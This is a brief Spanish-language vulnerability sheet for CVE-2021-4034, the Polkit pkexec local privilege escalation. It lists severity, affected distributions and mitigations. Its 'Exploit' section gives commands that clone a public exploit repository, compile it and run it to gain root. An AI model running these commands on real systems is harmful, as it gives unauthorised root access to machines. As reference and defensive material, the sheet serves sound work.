# CVE-2021-4034 - Polkit Local Privilege Escalation

## Información

| Campo      | Valor           |
|------------|-----------------|
| CVE ID     | CVE-2021-4034   |
| Fecha      | 2022-01-25      |
| Severidad  | Alto            |
| CVSS       | 7.8             |

## Descripción
Vulnerabilidad en Polkit (pkexec) que permite escalada de privilegios local.

## Sistemas Afectadas
- Todas las distribuciones Linux con Polkit
- Red Hat, Ubuntu, Debian, CentOS

## Exploit

```bash
# Descargar exploit
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
./cve-2021-4034
```

## Mitigación
- Actualizar a versiones parchadas
- Cambiar permisos de pkexec: `chmod 0755 /usr/bin/pkexec`
